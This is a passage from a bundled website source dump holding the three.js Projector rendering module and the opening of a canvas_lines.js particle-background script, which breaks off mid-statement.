THREE.Vector3();\n\tthis.positionWorld = new THREE.Vector3();\n\tthis.positionScreen = new THREE.Vector4();\n\n\tthis.visible = true;\n\n};\n\nTHREE.RenderableVertex.prototype.copy = function ( vertex ) {\n\n\tthis.positionWorld.copy( vertex.positionWorld );\n\tthis.positionScreen.copy( vertex.positionScreen );\n\n};\n\n//\n\nTHREE.RenderableLine = function () {\n\n\tthis.id = 0;\n\n\tthis.v1 = new THREE.RenderableVertex();\n\tthis.v2 = new THREE.RenderableVertex();\n\n\tthis.vertexColors = [ new THREE.Color(), new THREE.Color() ];\n\tthis.material = null;\n\n\tthis.z = 0;\n\tthis.renderOrder = 0;\n\n};\n\n//\n\nTHREE.RenderableSprite = function () {\n\n\tthis.id = 0;\n\n\tthis.object = null;\n\n\tthis.x = 0;\n\tthis.y = 0;\n\tthis.z = 0;\n\n\tthis.rotation = 0;\n\tthis.scale = new THREE.Vector2();\n\n\tthis.material = null;\n\tthis.renderOrder = 0;\n\n};\n\n//\n\nTHREE.Projector = function () {\n\n\tvar _object, _objectCount, _objectPool = [], _objectPoolLength = 0,\n\t_vertex, _vertexCount, _vertexPool = [], _vertexPoolLength = 0,\n\t_face, _faceCount, _facePool = [], _facePoolLength = 0,\n\t_line, _lineCount, _linePool = [], _linePoolLength = 0,\n\t_sprite, _spriteCount, _spritePool = [], _spritePoolLength = 0,\n\n\t_renderData = { objects: [], lights: [], elements: [] },\n\n\t_vector3 = new THREE.Vector3(),\n\t_vector4 = new THREE.Vector4(),\n\n\t_clipBox = new THREE.Box3( new THREE.Vector3( - 1, - 1, - 1 ), new THREE.Vector3( 1, 1, 1 ) ),\n\t_boundingBox = new THREE.Box3(),\n\t_points3 = new Array( 3 ),\n\t_points4 = new Array( 4 ),\n\n\t_viewMatrix = new THREE.Matrix4(),\n\t_viewProjectionMatrix = new THREE.Matrix4(),\n\n\t_modelMatrix,\n\t_modelViewProjectionMatrix = new THREE.Matrix4(),\n\n\t_normalMatrix = new THREE.Matrix3(),\n\n\t_frustum = new THREE.Frustum(),\n\n\t_clippedVertex1PositionScreen = new THREE.Vector4(),\n\t_clippedVertex2PositionScreen = new THREE.Vector4();\n\n\t//\n\n\tthis.projectVector = function ( vector, camera ) {\n\n\t\tconsole.warn( 'THREE.Projector: .projectVector() is now vector.project().' );\n\t\tvector.project( camera );\n\n\t};\n\n\tthis.unprojectVector = function ( vector, camera ) {\n\n\t\tconsole.warn( 'THREE.Projector: .unprojectVector() is now vector.unproject().' );\n\t\tvector.unproject( camera );\n\n\t};\n\n\tthis.pickingRay = function ( vector, camera ) {\n\n\t\tconsole.error( 'THREE.Projector: .pickingRay() is now raycaster.setFromCamera().' );\n\n\t};\n\n\t//\n\n\tvar RenderList = function () {\n\n\t\tvar normals = [];\n\t\tvar uvs = [];\n\n\t\tvar object = null;\n\t\tvar material = null;\n\n\t\tvar normalMatrix = new THREE.Matrix3();\n\n\t\tfunction setObject( value ) {\n\n\t\t\tobject = value;\n\t\t\tmaterial = object.material;\n\n\t\t\tnormalMatrix.getNormalMatrix( object.matrixWorld );\n\n\t\t\tnormals.length = 0;\n\t\t\tuvs.length = 0;\n\n\t\t}\n\n\t\tfunction projectVertex( vertex ) {\n\n\t\t\tvar position = vertex.position;\n\t\t\tvar positionWorld = vertex.positionWorld;\n\t\t\tvar positionScreen = vertex.positionScreen;\n\n\t\t\tpositionWorld.copy( position ).applyMatrix4( _modelMatrix );\n\t\t\tpositionScreen.copy( positionWorld ).applyMatrix4( _viewProjectionMatrix );\n\n\t\t\tvar invW = 1 / positionScreen.w;\n\n\t\t\tpositionScreen.x *= invW;\n\t\t\tpositionScreen.y *= invW;\n\t\t\tpositionScreen.z *= invW;\n\n\t\t\tvertex.visible = positionScreen.x >= - 1 && positionScreen.x <= 1 &&\n\t\t\t\t\t positionScreen.y >= - 1 && positionScreen.y <= 1 &&\n\t\t\t\t\t positionScreen.z >= - 1 && positionScreen.z <= 1;\n\n\t\t}\n\n\t\tfunction pushVertex( x, y, z ) {\n\n\t\t\t_vertex = getNextVertexInPool();\n\t\t\t_vertex.position.set( x, y, z );\n\n\t\t\tprojectVertex( _vertex );\n\n\t\t}\n\n\t\tfunction pushNormal( x, y, z ) {\n\n\t\t\tnormals.push( x, y, z );\n\n\t\t}\n\n\t\tfunction pushUv( x, y ) {\n\n\t\t\tuvs.push( x, y );\n\n\t\t}\n\n\t\tfunction checkTriangleVisibility( v1, v2, v3 ) {\n\n\t\t\tif ( v1.visible === true || v2.visible === true || v3.visible === true ) return true;\n\n\t\t\t_points3[ 0 ] = v1.positionScreen;\n\t\t\t_points3[ 1 ] = v2.positionScreen;\n\t\t\t_points3[ 2 ] = v3.positionScreen;\n\n\t\t\treturn _clipBox.intersectsBox( _boundingBox.setFromPoints( _points3 ) );\n\n\t\t}\n\n\t\tfunction checkBackfaceCulling( v1, v2, v3 ) {\n\n\t\t\treturn ( ( v3.positionScreen.x - v1.positionScreen.x ) *\n\t\t\t\t    ( v2.positionScreen.y - v1.positionScreen.y ) -\n\t\t\t\t    ( v3.positionScreen.y - v1.positionScreen.y ) *\n\t\t\t\t    ( v2.positionScreen.x - v1.positionScreen.x ) ) < 0;\n\n\t\t}\n\n\t\tfunction pushLine( a, b ) {\n\n\t\t\tvar v1 = _vertexPool[ a ];\n\t\t\tvar v2 = _vertexPool[ b ];\n\n\t\t\t_line = getNextLineInPool();\n\n\t\t\t_line.id = object.id;\n\t\t\t_line.v1.copy( v1 );\n\t\t\t_line.v2.copy( v2 );\n\t\t\t_line.z = ( v1.positionScreen.z + v2.positionScreen.z ) / 2;\n\t\t\t_line.renderOrder = object.renderOrder;\n\n\t\t\t_line.material = object.material;\n\n\t\t\t_renderData.elements.push( _line );\n\n\t\t}\n\n\t\tfunction pushTriangle( a, b, c ) {\n\n\t\t\tvar v1 = _vertexPool[ a ];\n\t\t\tvar v2 = _vertexPool[ b ];\n\t\t\tvar v3 = _vertexPool[ c ];\n\n\t\t\tif ( checkTriangleVisibility( v1, v2, v3 ) === false ) return;\n\n\t\t\tif ( material.side === THREE.DoubleSide || checkBackfaceCulling( v1, v2, v3 ) === true ) {\n\n\t\t\t\t_face = getNextFaceInPool();\n\n\t\t\t\t_face.id = object.id;\n\t\t\t\t_face.v1.copy( v1 );\n\t\t\t\t_face.v2.copy( v2 );\n\t\t\t\t_face.v3.copy( v3 );\n\t\t\t\t_face.z = ( v1.positionScreen.z + v2.positionScreen.z + v3.positionScreen.z ) / 3;\n\t\t\t\t_face.renderOrder = object.renderOrder;\n\n\t\t\t\t// use first vertex normal as face normal\n\n\t\t\t\t_face.normalModel.fromArray( normals, a * 3 );\n\t\t\t\t_face.normalModel.applyMatrix3( normalMatrix ).normalize();\n\n\t\t\t\tfor ( var i = 0; i < 3; i ++ ) {\n\n\t\t\t\t\tvar normal = _face.vertexNormalsModel[ i ];\n\t\t\t\t\tnormal.fromArray( normals, arguments[ i ] * 3 );\n\t\t\t\t\tnormal.applyMatrix3( normalMatrix ).normalize();\n\n\t\t\t\t\tvar uv = _face.uvs[ i ];\n\t\t\t\t\tuv.fromArray( uvs, arguments[ i ] * 2 );\n\n\t\t\t\t}\n\n\t\t\t\t_face.vertexNormalsLength = 3;\n\n\t\t\t\t_face.material = object.material;\n\n\t\t\t\t_renderData.elements.push( _face );\n\n\t\t\t}\n\n\t\t}\n\n\t\treturn {\n\t\t\tsetObject: setObject,\n\t\t\tprojectVertex: projectVertex,\n\t\t\tcheckTriangleVisibility: checkTriangleVisibility,\n\t\t\tcheckBackfaceCulling: checkBackfaceCulling,\n\t\t\tpushVertex: pushVertex,\n\t\t\tpushNormal: pushNormal,\n\t\t\tpushUv: pushUv,\n\t\t\tpushLine: pushLine,\n\t\t\tpushTriangle: pushTriangle\n\t\t}\n\n\t};\n\n\tvar renderList = new RenderList();\n\n\tthis.projectScene = function ( scene, camera, sortObjects, sortElements ) {\n\n\t\t_faceCount = 0;\n\t\t_lineCount = 0;\n\t\t_spriteCount = 0;\n\n\t\t_renderData.elements.length = 0;\n\n\t\tif ( scene.autoUpdate === true ) scene.updateMatrixWorld();\n\t\tif ( camera.parent === null ) camera.updateMatrixWorld();\n\n\t\t_viewMatrix.copy( camera.matrixWorldInverse.getInverse( camera.matrixWorld ) );\n\t\t_viewProjectionMatrix.multiplyMatrices( camera.projectionMatrix, _viewMatrix );\n\n\t\t_frustum.setFromMatrix( _viewProjectionMatrix );\n\n\t\t//\n\n\t\t_objectCount = 0;\n\n\t\t_renderData.objects.length = 0;\n\t\t_renderData.lights.length = 0;\n\n\t\tfunction addObject( object ) {\n\n\t\t\t_object = getNextObjectInPool();\n\t\t\t_object.id = object.id;\n\t\t\t_object.object = object;\n\n\t\t\t_vector3.setFromMatrixPosition( object.matrixWorld );\n\t\t\t_vector3.applyMatrix4( _viewProjectionMatrix );\n\t\t\t_object.z = _vector3.z;\n\t\t\t_object.renderOrder = object.renderOrder;\n\n\t\t\t_renderData.objects.push( _object );\n\n\t\t}\n\n\t\tscene.traverseVisible( function ( object ) {\n\n\t\t\tif ( object instanceof THREE.Light ) {\n\n\t\t\t\t_renderData.lights.push( object );\n\n\t\t\t} else if ( object instanceof THREE.Mesh || object instanceof THREE.Line ) {\n\n\t\t\t\tif ( object.material.visible === false ) return;\n\t\t\t\tif ( object.frustumCulled === true && _frustum.intersectsObject( object ) === false ) return;\n\n\t\t\t\taddObject( object );\n\n\t\t\t} else if ( object instanceof THREE.Sprite ) {\n\n\t\t\t\tif ( object.material.visible === false ) return;\n\t\t\t\tif ( object.frustumCulled === true && _frustum.intersectsSprite( object ) === false ) return;\n\n\t\t\t\taddObject( object );\n\n\t\t\t}\n\n\t\t} );\n\n\t\tif ( sortObjects === true ) {\n\n\t\t\t_renderData.objects.sort( painterSort );\n\n\t\t}\n\n\t\t//\n\n\t\tfor ( var o = 0, ol = _renderData.objects.length; o < ol; o ++ ) {\n\n\t\t\tvar object = _renderData.objects[ o ].object;\n\t\t\tvar geometry = object.geometry;\n\n\t\t\trenderList.setObject( object );\n\n\t\t\t_modelMatrix = object.matrixWorld;\n\n\t\t\t_vertexCount = 0;\n\n\t\t\tif ( object instanceof THREE.Mesh ) {\n\n\t\t\t\tif ( geometry instanceof THREE.BufferGeometry ) {\n\n\t\t\t\t\tvar attributes = geometry.attributes;\n\t\t\t\t\tvar groups = geometry.groups;\n\n\t\t\t\t\tif ( attributes.position === undefined ) continue;\n\n\t\t\t\t\tvar positions = attributes.position.array;\n\n\t\t\t\t\tfor ( var i = 0, l = positions.length; i < l; i += 3 ) {\n\n\t\t\t\t\t\trenderList.pushVertex( positions[ i ], positions[ i + 1 ], positions[ i + 2 ] );\n\n\t\t\t\t\t}\n\n\t\t\t\t\tif ( attributes.normal !== undefined ) {\n\n\t\t\t\t\t\tvar normals = attributes.normal.array;\n\n\t\t\t\t\t\tfor ( var i = 0, l = normals.length; i < l; i += 3 ) {\n\n\t\t\t\t\t\t\trenderList.pushNormal( normals[ i ], normals[ i + 1 ], normals[ i + 2 ] );\n\n\t\t\t\t\t\t}\n\n\t\t\t\t\t}\n\n\t\t\t\t\tif ( attributes.uv !== undefined ) {\n\n\t\t\t\t\t\tvar uvs = attributes.uv.array;\n\n\t\t\t\t\t\tfor ( var i = 0, l = uvs.length; i < l; i += 2 ) {\n\n\t\t\t\t\t\t\trenderList.pushUv( uvs[ i ], uvs[ i + 1 ] );\n\n\t\t\t\t\t\t}\n\n\t\t\t\t\t}\n\n\t\t\t\t\tif ( geometry.index !== null ) {\n\n\t\t\t\t\t\tvar indices = geometry.index.array;\n\n\t\t\t\t\t\tif ( groups.length > 0 ) {\n\n\t\t\t\t\t\t\tfor ( var g = 0; g < groups.length; g ++ ) {\n\n\t\t\t\t\t\t\t\tvar group = groups[ g ];\n\n\t\t\t\t\t\t\t\tfor ( var i = group.start, l = group.start + group.count; i < l; i += 3 ) {\n\n\t\t\t\t\t\t\t\t\trenderList.pushTriangle( indices[ i ], indices[ i + 1 ], indices[ i + 2 ] );\n\n\t\t\t\t\t\t\t\t}\n\n\t\t\t\t\t\t\t}\n\n\t\t\t\t\t\t} else {\n\n\t\t\t\t\t\t\tfor ( var i = 0, l = indices.length; i < l; i += 3 ) {\n\n\t\t\t\t\t\t\t\trenderList.pushTriangle( indices[ i ], indices[ i + 1 ], indices[ i + 2 ] );\n\n\t\t\t\t\t\t\t}\n\n\t\t\t\t\t\t}\n\n\t\t\t\t\t} else {\n\n\t\t\t\t\t\tfor ( var i = 0, l = positions.length / 3; i < l; i += 3 ) {\n\n\t\t\t\t\t\t\trenderList.pushTriangle( i, i + 1, i + 2 );\n\n\t\t\t\t\t\t}\n\n\t\t\t\t\t}\n\n\t\t\t\t} else if ( geometry instanceof THREE.Geometry ) {\n\n\t\t\t\t\tvar vertices = geometry.vertices;\n\t\t\t\t\tvar faces = geometry.faces;\n\t\t\t\t\tvar faceVertexUvs = geometry.faceVertexUvs[ 0 ];\n\n\t\t\t\t\t_normalMatrix.getNormalMatrix( _modelMatrix );\n\n\t\t\t\t\tvar material = object.material;\n\n\t\t\t\t\tvar isFaceMaterial = material instanceof THREE.MultiMaterial;\n\t\t\t\t\tvar objectMaterials = isFaceMaterial === true ? object.material : null;\n\n\t\t\t\t\tfor ( var v = 0, vl = vertices.length; v < vl; v ++ ) {\n\n\t\t\t\t\t\tvar vertex = vertices[ v ];\n\n\t\t\t\t\t\t_vector3.copy( vertex );\n\n\t\t\t\t\t\tif ( material.morphTargets === true ) {\n\n\t\t\t\t\t\t\tvar morphTargets = geometry.morphTargets;\n\t\t\t\t\t\t\tvar morphInfluences = object.morphTargetInfluences;\n\n\t\t\t\t\t\t\tfor ( var t = 0, tl = morphTargets.length; t < tl; t ++ ) {\n\n\t\t\t\t\t\t\t\tvar influence = morphInfluences[ t ];\n\n\t\t\t\t\t\t\t\tif ( influence === 0 ) continue;\n\n\t\t\t\t\t\t\t\tvar target = morphTargets[ t ];\n\t\t\t\t\t\t\t\tvar targetVertex = target.vertices[ v ];\n\n\t\t\t\t\t\t\t\t_vector3.x += ( targetVertex.x - vertex.x ) * influence;\n\t\t\t\t\t\t\t\t_vector3.y += ( targetVertex.y - vertex.y ) * influence;\n\t\t\t\t\t\t\t\t_vector3.z += ( targetVertex.z - vertex.z ) * influence;\n\n\t\t\t\t\t\t\t}\n\n\t\t\t\t\t\t}\n\n\t\t\t\t\t\trenderList.pushVertex( _vector3.x, _vector3.y, _vector3.z );\n\n\t\t\t\t\t}\n\n\t\t\t\t\tfor ( var f = 0, fl = faces.length; f < fl; f ++ ) {\n\n\t\t\t\t\t\tvar face = faces[ f ];\n\n\t\t\t\t\t\tmaterial = isFaceMaterial === true\n\t\t\t\t\t\t\t ? objectMaterials.materials[ face.materialIndex ]\n\t\t\t\t\t\t\t : object.material;\n\n\t\t\t\t\t\tif ( material === undefined ) continue;\n\n\t\t\t\t\t\tvar side = material.side;\n\n\t\t\t\t\t\tvar v1 = _vertexPool[ face.a ];\n\t\t\t\t\t\tvar v2 = _vertexPool[ face.b ];\n\t\t\t\t\t\tvar v3 = _vertexPool[ face.c ];\n\n\t\t\t\t\t\tif ( renderList.checkTriangleVisibility( v1, v2, v3 ) === false ) continue;\n\n\t\t\t\t\t\tvar visible = renderList.checkBackfaceCulling( v1, v2, v3 );\n\n\t\t\t\t\t\tif ( side !== THREE.DoubleSide ) {\n\n\t\t\t\t\t\t\tif ( side === THREE.FrontSide && visible === false ) continue;\n\t\t\t\t\t\t\tif ( side === THREE.BackSide && visible === true ) continue;\n\n\t\t\t\t\t\t}\n\n\t\t\t\t\t\t_face = getNextFaceInPool();\n\n\t\t\t\t\t\t_face.id = object.id;\n\t\t\t\t\t\t_face.v1.copy( v1 );\n\t\t\t\t\t\t_face.v2.copy( v2 );\n\t\t\t\t\t\t_face.v3.copy( v3 );\n\n\t\t\t\t\t\t_face.normalModel.copy( face.normal );\n\n\t\t\t\t\t\tif ( visible === false && ( side === THREE.BackSide || side === THREE.DoubleSide ) ) {\n\n\t\t\t\t\t\t\t_face.normalModel.negate();\n\n\t\t\t\t\t\t}\n\n\t\t\t\t\t\t_face.normalModel.applyMatrix3( _normalMatrix ).normalize();\n\n\t\t\t\t\t\tvar faceVertexNormals = face.vertexNormals;\n\n\t\t\t\t\t\tfor ( var n = 0, nl = Math.min( faceVertexNormals.length, 3 ); n < nl; n ++ ) {\n\n\t\t\t\t\t\t\tvar normalModel = _face.vertexNormalsModel[ n ];\n\t\t\t\t\t\t\tnormalModel.copy( faceVertexNormals[ n ] );\n\n\t\t\t\t\t\t\tif ( visible === false && ( side === THREE.BackSide || side === THREE.DoubleSide ) ) {\n\n\t\t\t\t\t\t\t\tnormalModel.negate();\n\n\t\t\t\t\t\t\t}\n\n\t\t\t\t\t\t\tnormalModel.applyMatrix3( _normalMatrix ).normalize();\n\n\t\t\t\t\t\t}\n\n\t\t\t\t\t\t_face.vertexNormalsLength = faceVertexNormals.length;\n\n\t\t\t\t\t\tvar vertexUvs = faceVertexUvs[ f ];\n\n\t\t\t\t\t\tif ( vertexUvs !== undefined ) {\n\n\t\t\t\t\t\t\tfor ( var u = 0; u < 3; u ++ ) {\n\n\t\t\t\t\t\t\t\t_face.uvs[ u ].copy( vertexUvs[ u ] );\n\n\t\t\t\t\t\t\t}\n\n\t\t\t\t\t\t}\n\n\t\t\t\t\t\t_face.color = face.color;\n\t\t\t\t\t\t_face.material = material;\n\n\t\t\t\t\t\t_face.z = ( v1.positionScreen.z + v2.positionScreen.z + v3.positionScreen.z ) / 3;\n\t\t\t\t\t\t_face.renderOrder = object.renderOrder;\n\n\t\t\t\t\t\t_renderData.elements.push( _face );\n\n\t\t\t\t\t}\n\n\t\t\t\t}\n\n\t\t\t} else if ( object instanceof THREE.Line ) {\n\n\t\t\t\tif ( geometry instanceof THREE.BufferGeometry ) {\n\n\t\t\t\t\tvar attributes = geometry.attributes;\n\n\t\t\t\t\tif ( attributes.position !== undefined ) {\n\n\t\t\t\t\t\tvar positions = attributes.position.array;\n\n\t\t\t\t\t\tfor ( var i = 0, l = positions.length; i < l; i += 3 ) {\n\n\t\t\t\t\t\t\trenderList.pushVertex( positions[ i ], positions[ i + 1 ], positions[ i + 2 ] );\n\n\t\t\t\t\t\t}\n\n\t\t\t\t\t\tif ( geometry.index !== null ) {\n\n\t\t\t\t\t\t\tvar indices = geometry.index.array;\n\n\t\t\t\t\t\t\tfor ( var i = 0, l = indices.length; i < l; i += 2 ) {\n\n\t\t\t\t\t\t\t\trenderList.pushLine( indices[ i ], indices[ i + 1 ] );\n\n\t\t\t\t\t\t\t}\n\n\t\t\t\t\t\t} else {\n\n\t\t\t\t\t\t\tvar step = object instanceof THREE.LineSegments ? 2 : 1;\n\n\t\t\t\t\t\t\tfor ( var i = 0, l = ( positions.length / 3 ) - 1; i < l; i += step ) {\n\n\t\t\t\t\t\t\t\trenderList.pushLine( i, i + 1 );\n\n\t\t\t\t\t\t\t}\n\n\t\t\t\t\t\t}\n\n\t\t\t\t\t}\n\n\t\t\t\t} else if ( geometry instanceof THREE.Geometry ) {\n\n\t\t\t\t\t_modelViewProjectionMatrix.multiplyMatrices( _viewProjectionMatrix, _modelMatrix );\n\n\t\t\t\t\tvar vertices = object.geometry.vertices;\n\n\t\t\t\t\tif ( vertices.length === 0 ) continue;\n\n\t\t\t\t\tv1 = getNextVertexInPool();\n\t\t\t\t\tv1.positionScreen.copy( vertices[ 0 ] ).applyMatrix4( _modelViewProjectionMatrix );\n\n\t\t\t\t\tvar step = object instanceof THREE.LineSegments ? 2 : 1;\n\n\t\t\t\t\tfor ( var v = 1, vl = vertices.length; v < vl; v ++ ) {\n\n\t\t\t\t\t\tv1 = getNextVertexInPool();\n\t\t\t\t\t\tv1.positionScreen.copy( vertices[ v ] ).applyMatrix4( _modelViewProjectionMatrix );\n\n\t\t\t\t\t\tif ( ( v + 1 ) % step > 0 ) continue;\n\n\t\t\t\t\t\tv2 = _vertexPool[ _vertexCount - 2 ];\n\n\t\t\t\t\t\t_clippedVertex1PositionScreen.copy( v1.positionScreen );\n\t\t\t\t\t\t_clippedVertex2PositionScreen.copy( v2.positionScreen );\n\n\t\t\t\t\t\tif ( clipLine( _clippedVertex1PositionScreen, _clippedVertex2PositionScreen ) === true ) {\n\n\t\t\t\t\t\t\t// Perform the perspective divide\n\t\t\t\t\t\t\t_clippedVertex1PositionScreen.multiplyScalar( 1 / _clippedVertex1PositionScreen.w );\n\t\t\t\t\t\t\t_clippedVertex2PositionScreen.multiplyScalar( 1 / _clippedVertex2PositionScreen.w );\n\n\t\t\t\t\t\t\t_line = getNextLineInPool();\n\n\t\t\t\t\t\t\t_line.id = object.id;\n\t\t\t\t\t\t\t_line.v1.positionScreen.copy( _clippedVertex1PositionScreen );\n\t\t\t\t\t\t\t_line.v2.positionScreen.copy( _clippedVertex2PositionScreen );\n\n\t\t\t\t\t\t\t_line.z = Math.max( _clippedVertex1PositionScreen.z, _clippedVertex2PositionScreen.z );\n\t\t\t\t\t\t\t_line.renderOrder = object.renderOrder;\n\n\t\t\t\t\t\t\t_line.material = object.material;\n\n\t\t\t\t\t\t\tif ( object.material.vertexColors === THREE.VertexColors ) {\n\n\t\t\t\t\t\t\t\t_line.vertexColors[ 0 ].copy( object.geometry.colors[ v ] );\n\t\t\t\t\t\t\t\t_line.vertexColors[ 1 ].copy( object.geometry.colors[ v - 1 ] );\n\n\t\t\t\t\t\t\t}\n\n\t\t\t\t\t\t\t_renderData.elements.push( _line );\n\n\t\t\t\t\t\t}\n\n\t\t\t\t\t}\n\n\t\t\t\t}\n\n\t\t\t} else if ( object instanceof THREE.Sprite ) {\n\n\t\t\t\t_vector4.set( _modelMatrix.elements[ 12 ], _modelMatrix.elements[ 13 ], _modelMatrix.elements[ 14 ], 1 );\n\t\t\t\t_vector4.applyMatrix4( _viewProjectionMatrix );\n\n\t\t\t\tvar invW = 1 / _vector4.w;\n\n\t\t\t\t_vector4.z *= invW;\n\n\t\t\t\tif ( _vector4.z >= - 1 && _vector4.z <= 1 ) {\n\n\t\t\t\t\t_sprite = getNextSpriteInPool();\n\t\t\t\t\t_sprite.id = object.id;\n\t\t\t\t\t_sprite.x = _vector4.x * invW;\n\t\t\t\t\t_sprite.y = _vector4.y * invW;\n\t\t\t\t\t_sprite.z = _vector4.z;\n\t\t\t\t\t_sprite.renderOrder = object.renderOrder;\n\t\t\t\t\t_sprite.object = object;\n\n\t\t\t\t\t_sprite.rotation = object.rotation;\n\n\t\t\t\t\t_sprite.scale.x = object.scale.x * Math.abs( _sprite.x - ( _vector4.x + camera.projectionMatrix.elements[ 0 ] ) / ( _vector4.w + camera.projectionMatrix.elements[ 12 ] ) );\n\t\t\t\t\t_sprite.scale.y = object.scale.y * Math.abs( _sprite.y - ( _vector4.y + camera.projectionMatrix.elements[ 5 ] ) / ( _vector4.w + camera.projectionMatrix.elements[ 13 ] ) );\n\n\t\t\t\t\t_sprite.material = object.material;\n\n\t\t\t\t\t_renderData.elements.push( _sprite );\n\n\t\t\t\t}\n\n\t\t\t}\n\n\t\t}\n\n\t\tif ( sortElements === true ) {\n\n\t\t\t_renderData.elements.sort( painterSort );\n\n\t\t}\n\n\t\treturn _renderData;\n\n\t};\n\n\t// Pools\n\n\tfunction getNextObjectInPool() {\n\n\t\tif ( _objectCount === _objectPoolLength ) {\n\n\t\t\tvar object = new THREE.RenderableObject();\n\t\t\t_objectPool.push( object );\n\t\t\t_objectPoolLength ++;\n\t\t\t_objectCount ++;\n\t\t\treturn object;\n\n\t\t}\n\n\t\treturn _objectPool[ _objectCount ++ ];\n\n\t}\n\n\tfunction getNextVertexInPool() {\n\n\t\tif ( _vertexCount === _vertexPoolLength ) {\n\n\t\t\tvar vertex = new THREE.RenderableVertex();\n\t\t\t_vertexPool.push( vertex );\n\t\t\t_vertexPoolLength ++;\n\t\t\t_vertexCount ++;\n\t\t\treturn vertex;\n\n\t\t}\n\n\t\treturn _vertexPool[ _vertexCount ++ ];\n\n\t}\n\n\tfunction getNextFaceInPool() {\n\n\t\tif ( _faceCount === _facePoolLength ) {\n\n\t\t\tvar face = new THREE.RenderableFace();\n\t\t\t_facePool.push( face );\n\t\t\t_facePoolLength ++;\n\t\t\t_faceCount ++;\n\t\t\treturn face;\n\n\t\t}\n\n\t\treturn _facePool[ _faceCount ++ ];\n\n\n\t}\n\n\tfunction getNextLineInPool() {\n\n\t\tif ( _lineCount === _linePoolLength ) {\n\n\t\t\tvar line = new THREE.RenderableLine();\n\t\t\t_linePool.push( line );\n\t\t\t_linePoolLength ++;\n\t\t\t_lineCount ++;\n\t\t\treturn line;\n\n\t\t}\n\n\t\treturn _linePool[ _lineCount ++ ];\n\n\t}\n\n\tfunction getNextSpriteInPool() {\n\n\t\tif ( _spriteCount === _spritePoolLength ) {\n\n\t\t\tvar sprite = new THREE.RenderableSprite();\n\t\t\t_spritePool.push( sprite );\n\t\t\t_spritePoolLength ++;\n\t\t\t_spriteCount ++;\n\t\t\treturn sprite;\n\n\t\t}\n\n\t\treturn _spritePool[ _spriteCount ++ ];\n\n\t}\n\n\t//\n\n\tfunction painterSort( a, b ) {\n\n\t\tif ( a.renderOrder !== b.renderOrder ) {\n\n\t\t\treturn a.renderOrder - b.renderOrder;\n\n\t\t} else if ( a.z !== b.z ) {\n\n\t\t\treturn b.z - a.z;\n\n\t\t} else if ( a.id !== b.id ) {\n\n\t\t\treturn a.id - b.id;\n\n\t\t} else {\n\n\t\t\treturn 0;\n\n\t\t}\n\n\t}\n\n\tfunction clipLine( s1, s2 ) {\n\n\t\tvar alpha1 = 0, alpha2 = 1,\n\n\t\t// Calculate the boundary coordinate of each vertex for the near and far clip planes,\n\t\t// Z = -1 and Z = +1, respectively.\n\t\tbc1near =  s1.z + s1.w,\n\t\tbc2near =  s2.z + s2.w,\n\t\tbc1far =  - s1.z + s1.w,\n\t\tbc2far =  - s2.z + s2.w;\n\n\t\tif ( bc1near >= 0 && bc2near >= 0 && bc1far >= 0 && bc2far >= 0 ) {\n\n\t\t\t// Both vertices lie entirely within all clip planes.\n\t\t\treturn true;\n\n\t\t} else if ( ( bc1near < 0 && bc2near < 0 ) || ( bc1far < 0 && bc2far < 0 ) ) {\n\n\t\t\t// Both vertices lie entirely outside one of the clip planes.\n\t\t\treturn false;\n\n\t\t} else {\n\n\t\t\t// The line segment spans at least one clip plane.\n\n\t\t\tif ( bc1near < 0 ) {\n\n\t\t\t\t// v1 lies outside the near plane, v2 inside\n\t\t\t\talpha1 = Math.max( alpha1, bc1near / ( bc1near - bc2near ) );\n\n\t\t\t} else if ( bc2near < 0 ) {\n\n\t\t\t\t// v2 lies outside the near plane, v1 inside\n\t\t\t\talpha2 = Math.min( alpha2, bc1near / ( bc1near - bc2near ) );\n\n\t\t\t}\n\n\t\t\tif ( bc1far < 0 ) {\n\n\t\t\t\t// v1 lies outside the far plane, v2 inside\n\t\t\t\talpha1 = Math.max( alpha1, bc1far / ( bc1far - bc2far ) );\n\n\t\t\t} else if ( bc2far < 0 ) {\n\n\t\t\t\t// v2 lies outside the far plane, v2 inside\n\t\t\t\talpha2 = Math.min( alpha2, bc1far / ( bc1far - bc2far ) );\n\n\t\t\t}\n\n\t\t\tif ( alpha2 < alpha1 ) {\n\n\t\t\t\t// The line segment spans two boundaries, but is outside both of them.\n\t\t\t\t// (This can't happen when we're only clipping against just near/far but good\n\t\t\t\t//  to leave the check here for future usage if other clip planes are added.)\n\t\t\t\treturn false;\n\n\t\t\t} else {\n\n\t\t\t\t// Update the s1 and s2 vertices to match the clipped line segment.\n\t\t\t\ts1.lerp( s2, alpha1 );\n\t\t\t\ts2.lerp( s1, 1 - alpha2 );\n\n\t\t\t\treturn true;\n\n\t\t\t}\n\n\t\t}\n\n\t}\n\n};\n"},{"url":"/lib/three/src/canvas_lines.js","content":"/**\n * Created by Tang on 2017/4/15.\n */\n$(function () {\n  var mouseX = 0,\n    mouseY = 0,\n    windowHalfX = window.innerWidth / 2,\n    windowHalfY = window.innerHeight / 2,\n    SEPARATION = 200,\n    AMOUNTX = 10,\n    AMOUNTY = 10,\n    camera, scene, renderer;\n  init();\n  animate();\n\n  function init() {\n    var container, separation = 100,\n      amountX = 50,\n      amountY = 50,\n      particles, particle;\n    container = document.createElement('div');\n    // è®¾ç½®css\n    container.style.position = \"fixed\";\n    container.style.top = \"0px\";\n    container.style.left = \"0px\";\n    container.style.zIndex = \"-1\";\n    container.style.opacity = \"0.5\";\n\n    document.body.appendChild(container);\n    camera = new THREE.PerspectiveCamera(75, window.innerWidth / window.innerHeight, 1, 10000);\n    camera.position.z = 100;\n    scene = new THREE.Scene();\n    renderer = new THREE.CanvasRenderer({\n      alpha: true\n    });\n    renderer.setPixelRatio(window.devicePixelRatio);\n    renderer.setSize(window.innerWidth, window.innerHeight);\n    container.appendChild(renderer.domElement);\n    // particles\n    var PI2 = Math.PI * 2;\n    var material = new THREE.SpriteCanvasMaterial({\n      color: 10263708,\n      program: function (context) {\n        context.beginPath();\n        context.arc(0, 0, 0.5, 0, PI2, true);\n        context.fill();\n      }\n    });\n    var geometry = new THREE.Geometry();\n    for (var i = 0; i < 100; i++) {\n      particle = new THREE.Sprite(material);\n      particle.position.x = Math.random() * 2 - 1;\n      particle.position.y = Math.random() * 2 - 1;\n      particle.position.z = Math.random() * 2 - 1;\n      particle.position.normalize();\n      particle.position.multiplyScalar(Math.random() * 10 + 450);\n      particle.scale.x = particle.scale.y = 10;\n      scene.add(particle);\n      geometry.vertices.push(particle.position);\n    }\n    // lines\n    var line = new THREE.Line(geometry, new THREE.LineBasicMaterial({\n      color: 10263708,\n      opacity: 0.5\n    }));\n    scene.add(line);\n    document.addEventListener('mousemove', 